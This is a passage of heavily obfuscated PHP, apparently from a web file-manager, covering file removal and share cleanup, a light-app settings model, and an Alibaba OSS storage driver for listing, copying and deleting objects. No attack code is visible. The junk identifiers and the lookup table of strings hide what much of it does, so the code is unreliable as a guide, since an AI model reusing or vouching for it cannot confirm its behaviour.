"\173\151\157\x3a{$½²ğó÷}\175\57", $­ŒÅÖ±œ); if (!IO::exist($Í»´Úƒ«) || !IO::isFile($Í»´Úƒ«)) { $‘êÊŸ«Ù[] = $ø¢‡°½Ê; $åŒìÒê->updateFileEnd($¾Íî€Ûë[$Ñé¹Ü¥ƒ[42]], $¾Íî€Ûë[$Ñé¹Ü¥ƒ[89]]); write_log($Ñé¹Ü¥ƒ[2533] . $Í»´Úƒ«, $Ñé¹Ü¥ƒ[2113]); continue; } $òèº†İ = IO::move($Í»´Úƒ«, $­ŒÅÖ±œ, REPEAT_RENAME); if (!$òèº†İ) { $¾ğŸèÑ„[] = $ø¢‡°½Ê; $åŒìÒê->updateFileEnd($¾Íî€Ûë[$Ñé¹Ü¥ƒ[42]], $¾Íî€Ûë[$Ñé¹Ü¥ƒ[89]]); write_log($Ñé¹Ü¥ƒ[2534] . $Í»´Úƒ«, $Ñé¹Ü¥ƒ[2113]); continue; } $¨×»‚Ÿ› = array($Ñé¹Ü¥ƒ[928] => $½²ğó÷, $Ñé¹Ü¥ƒ[97] => $òèº†İ); $¢ùûšğé->where(array($Ñé¹Ü¥ƒ[566] => $ø¢‡°½Ê))->save($¨×»‚Ÿ›); } $øó½¥×±++; $ìÓşÚôé = $¢ùûšğé->where($³íçŒ¢±)->field($Ñé¹Ü¥ƒ[2532])->selectPage($¡ŸÖÏ—ù, $øó½¥×±); } $ÁÉş´ˆÈ = $åŒìÒê->task; if (!$ã£ÇÚöÉ) { Cache::set($²±©òğÖ, $ÁÉş´ˆÈ); } $åŒìÒê->end(); $‘êÊŸ«Ù = array_unique($‘êÊŸ«Ù); $¾ğŸèÑ„ = array_unique($¾ğŸèÑ„); if (!$ã£ÇÚöÉ && ($‘êÊŸ«Ù || $¾ğŸèÑ„)) { $ …ñ¼è¶ = array(); if ($‘êÊŸ«Ù) { $ …ñ¼è¶[] = sprintf(LNG($Ñé¹Ü¥ƒ[2535]), count($‘êÊŸ«Ù)); } if ($¾ğŸèÑ„) { $ …ñ¼è¶[] = sprintf(LNG($Ñé¹Ü¥ƒ[2536]), count($¾ğŸèÑ„)); } $ …ñ¼è¶ = sprintf(LNG($Ñé¹Ü¥ƒ[2537]), implode($Ñé¹Ü¥ƒ[1582], $ …ñ¼è¶)) . $Ñé¹Ü¥ƒ[2538] . date($Ñé¹Ü¥ƒ[2539]) . $Ñé¹Ü¥ƒ[2540]; if ($¿©¼™ëº == $Ñé¹Ü¥ƒ[1330]) { $ …ñ¼è¶ .= $Ñé¹Ü¥ƒ[2541] . LNG($Ñé¹Ü¥ƒ[2542]); } else { $ …ñ¼è¶ = LNG($Ñé¹Ü¥ƒ[2543]) . $Ñé¹Ü¥ƒ[2544] . $ …ñ¼è¶; } $ÁÉş´ˆÈ[$Ñé¹Ü¥ƒ[1367]] = $ …ñ¼è¶; Cache::set($²±©òğÖ, $ÁÉş´ˆÈ); unset($®Óìüœı[$Ñé¹Ü¥ƒ[6]]); $¶Ï€¬‡ù = array($Ñé¹Ü¥ƒ[496] => $µ¼íÁÎ‘, $Ñé¹Ü¥ƒ[2419] => $Ñé¹Ü¥ƒ[652], $Ñé¹Ü¥ƒ[42] => $®Óìüœı[$Ñé¹Ü¥ƒ[42]], $Ñé¹Ü¥ƒ[106] => $®Óìüœı[$Ñé¹Ü¥ƒ[106]]); Hook::trigger($Ñé¹Ü¥ƒ[1983], array($Ñé¹Ü¥ƒ[1388] => $¶Ï€¬‡ù, $Ñé¹Ü¥ƒ[1398] => !0)); show_json($ …ñ¼è¶, !1, 100111); } if ($¿©¼™ëº == $Ñé¹Ü¥ƒ[652]) { return !0; } if ($‘êÊŸ«Ù || $¾ğŸèÑ„) { $©€¢ñ©Á = array_merge($‘êÊŸ«Ù, $¾ğŸèÑ„); $©€¢ñ©Á = array_filter(array_unique($©€¢ñ©Á)); $this->removeByFileID($©€¢ñ©Á); } if ($ç¹õÏÉ) { $ç¹õÏÉ = array_filter(array_unique($ç¹õÏÉ)); foreach ($ç¹õÏÉ as $Í»´Úƒ«) { $…÷îÄà‡ = IO::has($Í»´Úƒ«, !0); if (!$…÷îÄà‡[$Ñé¹Ü¥ƒ[249]] && !$…÷îÄà‡[$Ñé¹Ü¥ƒ[250]]) { IO::remove($Í»´Úƒ«); } } } return $this->remove($µ¼íÁÎ‘); } private function removeByFileID($ éÁ¥å = array()) { $ÜÚìş¬… =& $_SERVER[øşô´çË]; if (empty($ éÁ¥å)) { return; } $“ì¶Ø½ = array($ÜÚìş¬…[566] => array($ÜÚìş¬…[7], $ éÁ¥å)); $ˆÃ¶ú‹® = Model($ÜÚìş¬…[1529])->where($“ì¶Ø½)->field($ÜÚìş¬…[2491])->select(); if (!$ˆÃ¶ú‹®) { return Model($ÜÚìş¬…[569])->remove($ éÁ¥å); } $ˆÃ¶ú‹® = array_to_keyvalue($ˆÃ¶ú‹®, $ÜÚìş¬…[201], $ÜÚìş¬…[566]); foreach ($ˆÃ¶ú‹® as $Ãıµ×ˆ˜ => $ôµ¶¹İ•) { Model($ÜÚìş¬…[935])->removeNow($Ãıµ×ˆ˜, !1); } $ÑÏÕåÌç = array_diff($ éÁ¥å, array_unique(array_values($ˆÃ¶ú‹®))); if ($ÑÏÕåÌç) { return Model($ÜÚìş¬…[569])->remove($ÑÏÕåÌç); } } private function removeShareItems($ªàùƒ) { $ËüÑ³™‹ =& $_SERVER[øşô´çË]; $æÛÚŸÑë = "\173\x69\x6f\72{$ªàùƒ}\175\57"; $ÑÆá²ÙÊ = array($ËüÑ³™‹[201] => 0, $ËüÑ³™‹[592] => array($ËüÑ³™‹[482], "{$æÛÚŸÑë}\x25")); $™÷Ç°Ä¹ = Model($ËüÑ³™‹[1558])->where($ÑÆá²ÙÊ)->field($ËüÑ³™‹[696])->select(); if (empty($™÷Ç°Ä¹)) { return; } $¤¤…áµ° = array_to_keyvalue($™÷Ç°Ä¹, $ËüÑ³™‹[12], $ËüÑ³™‹[696]); Model($ËüÑ³™‹[695])->remove($¤¤…áµ°); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\56\x4c\x69\147\150\x74\x41\160\x70"; public $modelType = "\123\x79\x73\x74\145\155\117\160\164\x69\157\156"; public $field = array("\x6e\141\x6d\x65", "\x67\x72\157\165\x70", "\x64\145\x73\x63", "\143\x6f\x6e\x74\x65\156\164"); public function listData($Ûı §° = false, $ã–³ùÃš = "\155\157\144\x69\x66\x79\x54\x69\x6d\x65", $µå”Ç£» = true) { return parent::listData($Ûı §°, $ã–³ùÃš, $µå”Ç£»); } public function remove($Åªî²Ó§) { $şÀªşê¥ = $this->findByName($Åªî²Ó§); if (!$şÀªşê¥) { return !1; } return parent::remove($şÀªşê¥[$_SERVER[øşô´çË][496]]); } public function add($Úä´šé») { if ($this->findByName($Úä´šé»[$_SERVER[øşô´çË][42]])) { return !1; } return parent::insert($Úä´šé»); } public function update($Ûğ“—ŒŞ, $¿—Òœê) { $©š¤ÒâÏ =& $_SERVER[øşô´çË]; $á§ÒˆŞ = $this->findByName($Ûğ“—ŒŞ); $ÒïÆ­ë€ = $this->findByName($¿—Òœê[$©š¤ÒâÏ[42]]); if (!$á§ÒˆŞ || $ÒïÆ­ë€ && $ÒïÆ­ë€[$©š¤ÒâÏ[496]] != $á§ÒˆŞ[$©š¤ÒâÏ[496]]) { return !1; } return parent::update($á§ÒˆŞ[$©š¤ÒâÏ[496]], $¿—Òœê); } } goto Cµé¨§‚®; cÛ“ÍæÌšõ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($˜‹Ãì) { parent::__construct(); include_once SDK_DIR . $_SERVER[øşô´çË][1666]; $this->_init($˜‹Ãì); } public function _init($ø¶İÜÌ) { $ÂÖ¼Ÿ‰ =& $_SERVER[øşô´çË]; $this->config = $ø¶İÜÌ; foreach ($ø¶İÜÌ as $—Œß´ç => $µÙôÑÖá) { if (isset($this->{$—Œß´ç})) { $this->{$—Œß´ç} = $µÙôÑÖá; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÂÖ¼Ÿ‰[1667] . LNG($ÂÖ¼Ÿ‰[1668])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $İ÷Å†ÕŠ =& $_SERVER[øşô´çË]; $­ò·œ³² = new OSS\Model\CorsConfig(); $Â‹ÚÉ¸Ë = new OSS\Model\CorsRule(); $Â‹ÚÉ¸Ë->addAllowedOrigin($İ÷Å†ÕŠ[1669]); $Â‹ÚÉ¸Ë->addAllowedMethod($İ÷Å†ÕŠ[1670]); $Â‹ÚÉ¸Ë->addAllowedMethod($İ÷Å†ÕŠ[1671]); $Â‹ÚÉ¸Ë->addAllowedMethod($İ÷Å†ÕŠ[1672]); $Â‹ÚÉ¸Ë->addAllowedMethod($İ÷Å†ÕŠ[1673]); $Â‹ÚÉ¸Ë->addAllowedMethod($İ÷Å†ÕŠ[172]); $Â‹ÚÉ¸Ë->setMaxAgeSeconds(600); $Â‹ÚÉ¸Ë->addExposeHeader($İ÷Å†ÕŠ[1674]); $Â‹ÚÉ¸Ë->addAllowedHeader($İ÷Å†ÕŠ[1669]); $­ò·œ³²->addRule($Â‹ÚÉ¸Ë); try { $this->client->putBucketCors($this->bucket, $­ò·œ³²); } catch (OSS\Core\OssException $Ó§÷ªÓÒ) { $this->writeLog(__FUNCTION__ . $İ÷Å†ÕŠ[222] . $Ó§÷ªÓÒ->getMessage()); return !1; } return !0; } public function getBucketCors() { $‰îÇ™ÕÙ =& $_SERVER[øşô´çË]; $€¤íô¯È = null; try { $€¤íô¯È = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $çïƒ÷‚) { $this->writeLog(__FUNCTION__ . $‰îÇ™ÕÙ[222] . $çïƒ÷‚->getMessage()); return null; } if (!$€¤íô¯È || !($Ç«ÃÍ‚ù = $€¤íô¯È->getRules())) { return null; } $Šù¤¹Æ” = $Ç«ÃÍ‚ù[0]->getAllowedOrigins(); $æ‡ü±ïõ = $Ç«ÃÍ‚ù[0]->getAllowedMethods(); $ºëé•óÂ = $Ç«ÃÍ‚ù[0]->getMaxAgeSeconds(); $ëÆŞ˜„€ = $Ç«ÃÍ‚ù[0]->getExposeHeaders(); $±°Äú‘± = $Ç«ÃÍ‚ù[0]->getAllowedHeaders(); return array($‰îÇ™ÕÙ[228] => isset($Šù¤¹Æ”[0]) ? $Šù¤¹Æ”[0] : $‰îÇ™ÕÙ[12], $‰îÇ™ÕÙ[232] => $æ‡ü±ïõ, $‰îÇ™ÕÙ[1675] => $ºëé•óÂ, $‰îÇ™ÕÙ[1676] => isset($ëÆŞ˜„€[0]) ? $ëÆŞ˜„€[0] : $‰îÇ™ÕÙ[12], $‰îÇ™ÕÙ[229] => isset($±°Äú‘±[0]) ? $±°Äú‘±[0] : $‰îÇ™ÕÙ[12]); } public function isBucketCors() { $õé°ê™Ò =& $_SERVER[øşô´çË]; $ÜŸÀå£³ = $this->getBucketCors(); if (!$ÜŸÀå£³ || !is_array($ÜŸÀå£³)) { return !1; } if ($ÜŸÀå£³[$õé°ê™Ò[228]] != $õé°ê™Ò[230] || $ÜŸÀå£³[$õé°ê™Ò[229]] != $õé°ê™Ò[230]) { return !1; } $”½ïšù¯ = array_map($õé°ê™Ò[231], $ÜŸÀå£³[$õé°ê™Ò[232]]); if (!is_array($”½ïšù¯)) { $”½ïšù¯ = array(); } $ºÕÎÈèø = array($õé°ê™Ò[233], $õé°ê™Ò[234], $õé°ê™Ò[235], $õé°ê™Ò[236], $õé°ê™Ò[237]); $æÃ€ùª = array_diff($ºÕÎÈèø, $”½ïšù¯); return empty($æÃ€ùª); } public function mkfile($§ùÔ›¿ƒ, $Ÿ€ış¬ç = '', $ÆœÁÕŞØ = REPEAT_RENAME) { $ŒŸ¨õ¾ = $this->setContent($§ùÔ›¿ƒ, $Ÿ€ış¬ç); if ($ŒŸ¨õ¾ !== !1) { return $this->getPathOuter($§ùÔ›¿ƒ); } return !1; } public function mkdir($†³ş­–³, $ÑñÊÎÂæ = REPEAT_SKIP) { if ($ÑñÊÎÂæ && $this->_isFolder($†³ş­–³)) { return $this->getPathOuter($†³ş­–³); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($†³ş­–³)); } catch (OSS\Core\OssException $öŠãÀé) { $this->writeLog(__FUNCTION__ . $_SERVER[øşô´çË][222] . $öŠãÀé->getMessage()); return !1; } return $this->getPathOuter($†³ş­–³); } private function fileList($ç‰–Áñ·, $‘Ñ¤ÁÙø = '', $˜½Î×Ç = 0) { $Öø®šÏ =& $_SERVER[øşô´çË]; $ç‰–Áñ· = trim($ç‰–Áñ·, $Öø®šÏ[8]); $£º«Êáß = empty($ç‰–Áñ·) && $ç‰–Áñ· !== $Öø®šÏ[238] ? $Öø®šÏ[12] : $ç‰–Áñ· . $Öø®šÏ[8]; $üÉµ“ØÉ = $Öø®šÏ[12]; $ÍÙòôƒÎ = 1000; $ÍÄ÷´ï = $ú‰ÇúíĞ = array(); while (!0) { check_abort(); $Ã­æ¦ô = array($Öø®šÏ[1677] => $‘Ñ¤ÁÙø, $Öø®šÏ[1678] => $£º«Êáß, $Öø®šÏ[1679] => $ÍÙòôƒÎ, $Öø®šÏ[1680] => $üÉµ“ØÉ); try { $£ÅàÅÊ› = $this->client->listObjects($this->bucket, $Ã­æ¦ô); } catch (OSS\Core\OssException $÷¨²ÊËŸ) { $this->writeLog(__FUNCTION__ . $Öø®šÏ[222] . $÷¨²ÊËŸ->getMessage()); break; } $üÉµ“ØÉ = $£ÅàÅÊ›->getNextMarker(); $ù×Üº = $£ÅàÅÊ›->getObjectList(); $¯äÙìŒ = $£ÅàÅÊ›->getPrefixList(); foreach ($ù×Üº as $íİÓ–ôİ) { if ($íİÓ–ôİ->getKey() == $£º«Êáß) { continue; } $”³¯ŸƒÙ = $íİÓ–ôİ->getKey(); $ä»¡´ = $íİÓ–ôİ->getSize(); $¡¡ƒ÷İà = $íİÓ–ôİ->getLastModified(); $·¹òŞº¯ = trim($íİÓ–ôİ->getETag(), $Öø®šÏ[128]); $†¦´Û™¬ = $˜½Î×Ç ? array($Öø®šÏ[42] => $”³¯ŸƒÙ, $Öø®šÏ[89] => $ä»¡´, $Öø®šÏ[214] => strtotime($¡¡ƒ÷İà), $Öø®šÏ[1681] => $·¹òŞº¯) : $”³¯ŸƒÙ; $’•”•ñ« = $ä»¡´ == 0 && substr($”³¯ŸƒÙ, strlen($”³¯ŸƒÙ) - 1, 1) == $Öø®šÏ[8] ? !0 : !1; $¬Òêˆµí = array($Öø®šÏ[89] => $ä»¡´, $Öø®šÏ[1682] => $ä»¡´, $Öø®šÏ[98] => strtotime($¡¡ƒ÷İà), $Öø®šÏ[1683] => $¡¡ƒ÷İà, $Öø®šÏ[1681] => $·¹òŞº¯); $this->cacheMethodInfoSet($”³¯ŸƒÙ, $’•”•ñ«, $¬Òêˆµí); if ($’•”•ñ«) { $ÍÄ÷´ï[] = $”³¯ŸƒÙ; continue; } $ú‰ÇúíĞ[] = $†¦´Û™¬; } foreach ($¯äÙìŒ as $ûŞÕ¤Ùğ) { $ÍÄ÷´ï[] = $ûŞÕ¤Ùğ->getPrefix(); $this->cacheMethodInfoSet($ûŞÕ¤Ùğ->getPrefix(), !0); } if ($üÉµ“ØÉ === $Öø®šÏ[12]) { break; } } $this->cacheMethodInfoSet($ç‰–Áñ·, !0); return array($Öø®šÏ[95] => $ÍÄ÷´ï, $Öø®šÏ[96] => $ú‰ÇúíĞ); } public function listObject($‰‘¦£†´, $ø«Ä×‡ = '') { $ ƒÌªí® =& $_SERVER[øşô´çË]; $‰‘¦£†´ = trim($‰‘¦£†´, $ ƒÌªí®[8]); $ß¢ªâ¡· = empty($‰‘¦£†´) && $‰‘¦£†´ !== $ ƒÌªí®[238] ? $ ƒÌªí®[12] : $‰‘¦£†´ . $ ƒÌªí®[8]; $“ôãİÌ² = $ ƒÌªí®[12]; $ğ­ù±¨ç = 1000; $‰È¨° = $€ÜİÊ«Š = array(); while (!0) { check_abort(); $Şö²­¦å = array($ ƒÌªí®[1677] => $ø«Ä×‡, $ ƒÌªí®[1678] => $ß¢ªâ¡·, $ ƒÌªí®[1679] => $ğ­ù±¨ç, $ ƒÌªí®[1680] => $“ôãİÌ²); try { $á£úã›Í = $this->client->listObjects($this->bucket, $Şö²­¦å); } catch (OSS\Core\OssException $ªÏä¡€ì) { $this->writeLog(__FUNCTION__ . $ ƒÌªí®[222] . $ªÏä¡€ì->getMessage()); break; } $“ôãİÌ² = $á£úã›Í->getNextMarker(); $ì›èÎÀĞ = $á£úã›Í->getObjectList(); foreach ($ì›èÎÀĞ as $½Åéöú•) { if ($½Åéöú•->getKey() == $ß¢ªâ¡·) { continue; } $ì—ï†Øµ = $½Åéöú•->getKey(); $©·Ãğ³Û = $½Åéöú•->getSize(); $òü˜°™Ó = $©·Ãğ³Û == 0 && substr($ì—ï†Øµ, strlen($ì—ï†Øµ) - 1, 1) == $ ƒÌªí®[8] ? !0 : !1; if ($òü˜°™Ó) { continue; } $€ÜİÊ«Š[] = $©·Ãğ³Û . $ ƒÌªí®[222] . $ì—ï†Øµ; } if ($“ôãİÌ² === $ ƒÌªí®[12]) { break; } } return array($ ƒÌªí®[95] => $‰È¨°, $ ƒÌªí®[96] => $€ÜİÊ«Š); } public function copyFile($ÒÏ÷ú‚, $ãœ‡Òú) { $À×Ñòù» = $this->size($ÒÏ÷ú‚); if ($À×Ñòù» < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ÒÏ÷ú‚, $this->bucket, $this->pathEncode($ãœ‡Òú)); } catch (OSS\Core\OssException $Š˜Ç·î‚) { $this->writeLog(__FUNCTION__ . $_SERVER[øşô´çË][222] . $Š˜Ç·î‚->getMessage()); return !1; } return $this->getPathOuter($ãœ‡Òú); } $ÓŠ´ŸõÌ = $this->multiCopyObject($ÒÏ÷ú‚, $ãœ‡Òú, $À×Ñòù»); return $ÓŠ´ŸõÌ ? $this->getPathOuter($ãœ‡Òú) : !1; } private function multiCopyObject($Öç§ê», $Ëù¨¡Á¾, $»‰‹—´Ş) { $÷Ãäã®¨ =& $_SERVER[øşô´çË]; try { $ÚİÁÕ­¥ = array(); if ($ñ¹ÚÇãÙ = $this->hashMd5($Öç§ê»)) { $ÚİÁÕ­¥ = array(OSS\OssClient::OSS_HEADERS => array($÷Ãäã®¨[1684] => $ñ¹ÚÇãÙ)); } $¨ƒ¢…¼í = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ëù¨¡Á¾), $ÚİÁÕ­¥); $úÜ¢¦¶‚ = 1; $Í­ƒ˜ìÇ = 0; $Ñ¾şË˜§ = array(); $İäöÉÄÌ = 1024 * 1024 * 10; $ïåË§ãì = $this->client->generateMultiuploadParts($»‰‹—´Ş, $İäöÉÄÌ); foreach ($ïåË§ãì as $Êá™Ğ»– => $·Î×“ËË) { $¼¢åÀâè = $Í­ƒ˜ìÇ + (int) $·Î×“ËË[$÷Ãäã®¨[1685]]; $ÔØ“²ö = (int) $·Î×“ËË[$÷Ãäã®¨[421]] + $¼¢åÀâè - 1; $Õ•®³·¤ = array($÷Ãäã®¨[174] => $¼¢åÀâè, $÷Ãäã®¨[175] => $ÔØ“²ö); $Ñ¾şË˜§[] = $this->client->uploadPartCopy($this->bucket, $Öç§ê», $this->bucket, $this->pathEncode($Ëù¨¡Á¾), $úÜ¢¦¶‚, $¨ƒ¢…¼í, $Õ•®³·¤); $úÜ¢¦¶‚ = $úÜ¢¦¶‚ + 1; } $Ù‡¾“öÆ = array(); foreach ($Ñ¾şË˜§ as $Êá™Ğ»– => $ñãá‚ı) { $Ù‡¾“öÆ[] = array($÷Ãäã®¨[306] => $Êá™Ğ»– + 1, $÷Ãäã®¨[307] => $ñãá‚ı); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ëù¨¡Á¾), $¨ƒ¢…¼í, $Ù‡¾“öÆ); } catch (OSS\Core\OssException $»ÛŠÜğ) { $this->writeLog(__FUNCTION__ . $÷Ãäã®¨[222] . $»ÛŠÜğ->getMessage()); return !1; } return !0; } public function moveFile($è½“ŠÜ¿, $²Å’¬÷´) { if ($this->copyFile($è½“ŠÜ¿, $²Å’¬÷´)) { $this->remove($è½“ŠÜ¿); return $this->getPathOuter($²Å’¬÷´); } return !1; } public function delFile($¬÷Ï›ªš) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¬÷Ï›ªš)); } catch (OSS\Core\OssException $õ¾ğüÈ¸) { $this->writeLog(__FUNCTION__ . $_SERVER[øşô´çË][222] . $õ¾ğüÈ¸->getMessage()); return !1; } return !0; } public function delFolder($¿šÎ•ëÛ) { $ö€èåÄ =& $_SERVER[øşô´çË]; if (!$this->exist($¿šÎ•ëÛ)) { return !0; } $this->listItemCache = !1; $Ú©œ²ş = $this->fileList($¿šÎ•ëÛ); $this->listItemCache = !0; $¹¯âÊàé = trim($¿šÎ•ëÛ, $ö€èåÄ[8]) . $ö€èåÄ[8]; if (!empty($¿šÎ•ëÛ) && $¿šÎ•ëÛ !== $ö€èåÄ[238] && !in_array($¹¯âÊàé, $Ú©œ²ş[$ö€èåÄ[95]])) { $Ú©œ²ş[$ö€èåÄ[95]][] = $¹¯âÊàé; } $úÌıá¾ = $this->delByBatch($Ú©œ²ş[$ö€èåÄ[96]]); if (!$úÌıá¾) { return !1; } $úÌıá¾ = $this->delByBatch($Ú©œ²ş[$ö€èåÄ[95]]); if (!$úÌıá¾) { return !1; } return $this->delFile($¹¯âÊàé); } private function delByBatch($§¦åËß´) { foreach (array_chunk($§¦åËß´, 1000) as $¡êøú¨ã) { try { $this->client->deleteObjects($this->bucket, $¡êøú¨ã); } catch (OSS\Core\OssException $ì¨º©øÈ) { $this->writeLog(__FUNCTION__ . $_SERVER[øşô´çË][222] . $ì¨º©øÈ->getMessage()); return !1; } } return !0; } public function rename($ÀÖİº¸ì, $¹ÃÉ§ñÖ) { return $this->renameObject($ÀÖİº¸ì, $¹ÃÉ§ñÖ); } private function fileInfo($Ö¢•«, $òˆŠ‹â = false, $Š¥³öÖó = array()) { $£Õ·½Õô =& $_SERVER[øşô´çË]; $¢÷Í½â = array($£Õ·½Õô[42] => $this->pathThis($Ö¢•«), $£Õ·½Õô[97] => $this->getPathOuter($Ö¢•«), $£Õ·½Õô[43] => $£Õ·½Õô[240], $£Õ·½Õô[89] => isset($Š¥³öÖó[$£Õ·½Õô[89]]) ? $Š¥³öÖó[$£Õ·½Õô[89]] : 0, $£Õ·½Õô[176] => $this->ext($Ö¢•«)); if ($òˆŠ‹â) { return $¢÷Í½â; } $¢÷Í½â[$£Õ·½Õô[241]] = $¢÷Í½â[$£Õ·½Õô[98]] = 0; $¢÷Í½â[$£Õ·½Õô[242]] = $¢÷Í½â[$£Õ·½Õô[243]] = !0; if (empty($Š¥³öÖó)) { $ÇÚ°èûõ = $this->objectMeta($Ö¢•«); if (!$ÇÚ°èûõ) { return $¢÷Í½â; } $Š¥³öÖó = array($£Õ·½Õô[98] => strtotime($ÇÚ°èûõ[$£Õ·½Õô[1683]]), $£Õ·½Õô[89] => $ÇÚ°èûõ[$£Õ·½Õô[1682]] + 0, $£Õ·½Õô[1681] => $ÇÚ°èûõ[$£Õ·½Õô[1681]]); } if (isset($Š¥³öÖó[$£Õ·½Õô[1681]]) && $Š¥³öÖó[$£Õ·½Õô[1681]]) { $¢÷Í½â[$£Õ·½Õô[245]] = trim($Š¥³öÖó[$£Õ·½Õô[1681]], $£Õ·½Õô[128]); } if (isset($Š¥³öÖó[$£Õ·½Õô[89]])) { $¢÷Í½â[$£Õ·½Õô[89]] = $Š¥³öÖó[$£Õ·½Õô[89]]; } if (isset($Š¥³öÖó[$£Õ·½Õô[98]])) { $¢÷Í½â[$£Õ·½Õô[98]] = $Š¥³öÖó[$£Õ·½Õô[98]]; } if (isset($Š¥³öÖó[$£Õ·½Õô[214]]) && !trim($¢÷Í½â[$£Õ·½Õô[98]])) { $¢÷Í½â[$£Õ·½Õô[98]] = $Š¥³öÖó[$£Õ·½Õô[214]]; } return $¢÷Í½â; } private function folderInfo($´ñ¬€®, $˜¸¹©¦ = false, $Ïï¬·õ = array()) { $ôçîåĞ¡ =& $_SERVER[øşô´çË]; $³±í‰«Ä = array($ôçîåĞ¡[42] => $this->pathThis($´ñ¬€®), $ôçîåĞ¡[97] => $this->getPathOuter($ôçîåĞ¡[8] . $´ñ¬€®), $ôçîåĞ¡[43] => $ôçîåĞ¡[88]); if ($˜¸¹©¦) { return $³±í‰«Ä; } $³±í‰«Ä[$ôçîåĞ¡[241]] = $³±í‰«Ä[$ôçîåĞ¡[98]] = 0; $³±í‰«Ä[$ôçîåĞ¡[242]] = $³±í‰«Ä[$ôçîåĞ¡[243]] = !0; if (empty($Ïï¬·õ)) { $´ñ¬€® = rtrim($´ñ¬€®, $ôçîåĞ¡[8]) . $ôçîåĞ¡[8]; $É‘ç¡ê = $this->objectMeta($´ñ¬€®); if (!$É‘ç¡ê) { return $³±í‰«Ä; } $Ïï¬·õ = array($ôçîåĞ¡[241] => $É‘ç¡ê[$ôçîåĞ¡[604]][$ôçîåĞ¡[1686]], $ôçîåĞ¡[98] => strtotime($É‘ç¡ê[$ôçîåĞ¡[1683]])); } if (isset($Ïï¬·õ[$ôçîåĞ¡[98]])) { $³±í‰«Ä[$ôçîåĞ¡[98]] = $Ïï¬·õ[$ôçîåĞ¡[98]]; } if (isset($Ïï¬·õ[$ôçîåĞ¡[241]])) { $³±í‰«Ä[$ôçîåĞ¡[241]] = $Ïï¬·õ[$ôçîåĞ¡[241]]; } return $³±í‰«Ä; } public function listPath($á±‹Ú§¡, $ÆÂ£ªº = false) { $»Àş©µ© =& $_SERVER[øşô´çË]; $ÀºµË¦Ú = $this->fileList($á±‹Ú§¡, $»Àş©µ©[8], !0); foreach ($ÀºµË¦Ú[$»Àş©µ©[95]] as $ô¡¿¿·¬ => $ˆö¡Íã©) { $ÀºµË¦Ú[$»Àş©µ©[95]][$ô¡¿¿·¬] = $this->folderInfo($ˆö¡Íã©, $ÆÂ£ªº, $ˆö¡Íã©); } foreach ($ÀºµË¦Ú[$»Àş©µ©[96]] as $ô¡¿¿·¬ => $ˆö¡Íã©) { $ÀºµË¦Ú[$»Àş©µ©[96]][$ô¡¿¿·¬] = $this->fileInfo($ˆö¡Íã©[$»Àş©µ©[42]], $ÆÂ£ªº, $ˆö¡Íã©); } return $ÀºµË¦Ú; } protected function infoChildren($ê¡—ªÒ’, &$‹Û¥—©ª) { $ˆ½¾·¤ë =& $_SERVER[øşô´çË]; $è¾Óãºé = $this->fileList($ê¡—ªÒ’, $ˆ½¾·¤ë[12], !0); $‹Û¥—©ª[$ˆ½¾·¤ë[91]] += count($è¾Óãºé[$ˆ½¾·¤ë[95]]); $‹Û¥—©ª[$ˆ½¾·¤ë[90]] += count($è¾Óãºé[$ˆ½¾·¤ë[96]]); foreach ($è¾Óãºé[$ˆ½¾·¤ë[96]] as $À³Éïâö) { if (!$À³Éïâö || !$À³Éïâö[$ˆ½¾·¤ë[89]]) { continue; } $‹Û¥—©ª[$ˆ½¾·¤ë[89]] += $À³Éïâö[$ˆ½¾·¤ë[89]]; } } public function has($ó§Ú—“½, $‘–Äáİï = false, $—ãßîıö = true) { $æÇåÚï‚ =& $_SERVER[øşô´çË]; $ó§Ú—“½ = trim($ó§Ú—“½, $æÇåÚï‚[8]); $™Ï¸´ü = empty($ó§Ú—“½) && $ó§Ú—“½ !== $æÇåÚï‚[238] ? $æÇåÚï‚[12] : $ó§Ú—“½ . $æÇåÚï‚[8]; $ùœºÃÈ = $æÇåÚï‚[12]; $¶î˜Ë¿³ = 500; $‹ÖÑ‹¾Û = $°€»óß³ = 0; while (!0) { check_abort(); $ã²ÌË¼™ = array($æÇåÚï‚[1677] => $æÇåÚï‚[8], $æÇåÚï‚[1678] => $™Ï¸´ü, $æÇåÚï‚[1679] => $¶î˜Ë¿³, $æÇåÚï‚[1680] => $ùœºÃÈ); try { $«‰œ½³ = $this->client->listObjects($this->bucket, $ã²ÌË¼™); } catch (OSS\Core\OssException $¢¢¦ŞÜ¯) { $this->writeLog(__FUNCTION__ . $æÇåÚï‚[222] . $¢¢¦ŞÜ¯->getMessage()); break; } $ùœºÃÈ = $«‰œ½³->getNextMarker(); $ÄŸÍ½›¿ = $«‰œ½³->getObjectList(); $Ù¾Ã†ñ— = $«‰œ½³->getPrefixList(); if ($‘–Äáİï) { if (count($ÄŸÍ½›¿) > 1 || count($ÄŸÍ½›¿) == 1 && $ÄŸÍ½›¿[0]->getKey() != $™Ï¸´ü) { $‹ÖÑ‹¾Û += count($ÄŸÍ½›¿) - 1; } if (!empty($Ù¾Ã†ñ—)) { $°€»óß³ += count($Ù¾Ã†ñ—); } if ($ùœºÃÈ === $æÇåÚï‚[12]) { break; } continue; } if ($—ãßîıö) { if (!empty($ÄŸÍ½›¿)) { if (count($ÄŸÍ½›¿) > 1 || $ÄŸÍ½›¿[0]->getKey() != $™Ï¸´ü) { return !0; } } } else { if (!empty($Ù¾Ã†ñ—)) { return !0; } } if ($ùœºÃÈ === $æÇåÚï‚[12]) { break; } } if ($‘–Äáİï) { return array($æÇåÚï‚[249] => $‹ÖÑ‹¾Û, $æÇåÚï‚[250] => $°€»óß³); } return !1; } public function listAll($Âˆ´šÏ) { $©¡±³êá =& $_SERVER[øşô´çË]; $­°¼£Àî = 